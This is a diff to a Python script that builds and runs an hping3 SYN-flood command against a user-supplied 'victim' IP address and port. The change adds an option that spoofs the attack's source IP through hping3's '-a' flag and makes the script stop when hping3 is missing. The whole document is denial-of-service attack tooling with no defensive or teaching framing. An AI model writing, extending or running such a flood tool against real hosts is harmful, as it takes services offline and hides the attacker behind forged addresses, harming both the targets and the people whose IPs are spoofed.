@@ -41,6 +41,7 @@ if __name__ == '__main__':
     parser.add_argument(dest='ipVictim', metavar='ipVictim', action='store', help='IP address of the victim', nargs=1)
     parser.add_argument('-p', dest='destPort', metavar='destPort', action='store', default=80, type=int, help='default: 80 (http)')
     parser.add_argument('--speed', dest='attackSpeed', metavar='attackSpeed', action='store', choices=['fast','faster'], default='fast', help='fast or flood')
+    parser.add_argument('-s', dest='spoofingIP', metavar='spoofingIP', action='store', help='source IP for the attack')
     args = parser.parse_args()
 
     
@@ -61,10 +62,11 @@ if __name__ == '__main__':
     except subprocess.CalledProcessError as e:
         installed = False
         print 'hping3 is not installed in your system. Please, install it'
-        #exit(-1)
+        exit(-1)
     
     command = ('sudo hping3 -w 64 -S -d 120' +  
                 ' -p ' + str(args.destPort) + 
+                ' -a ' + args.spoofingIP + 
                 speed + 
                 ' ' + args.ipVictim[0])
     log.info ('Ejecutando comando: ' + command)
